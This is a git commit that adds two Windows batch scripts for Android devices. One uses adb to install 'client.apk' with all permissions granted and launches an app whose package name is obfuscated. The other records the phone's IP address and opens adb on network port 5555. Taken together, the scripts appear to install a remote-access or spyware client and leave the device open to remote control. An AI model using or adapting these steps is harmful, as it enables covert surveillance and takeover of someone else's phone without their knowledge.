1f934f6d6e9da85dec5a7cb6aa5021ecb0b5e880
riad1666 <mdriadahmed14@gmail.com>
2023-02-16 15:08:30 +0600

    Add files via upload

---
+++ install and open.bat
@@ -0,0 +1,7 @@
+adb devices
+
+adb install -g client.apk
+
+adb shell monkey -p cmf0.c3b5bm90zq.patch -c android.intent.category.LAUNCHER 1
+
+pause
---
+++ open port and save ip.bat
@@ -0,0 +1,9 @@
+adb kill-server
+
+adb devices
+
+adb shell ip address >abc.txt
+
+adb tcpip 5555
+
+adb devices
